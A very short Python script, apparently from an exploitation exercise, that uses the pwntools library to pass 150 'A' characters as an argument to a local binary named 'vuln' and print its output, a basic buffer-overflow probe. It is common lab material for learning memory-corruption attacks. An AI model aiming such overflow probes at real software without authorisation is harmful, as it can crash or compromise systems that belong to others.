#!/usr/bin/env python

from pwn import *

payload = "A" * 150
r = process(["./vuln", payload])
print(r.recvall())
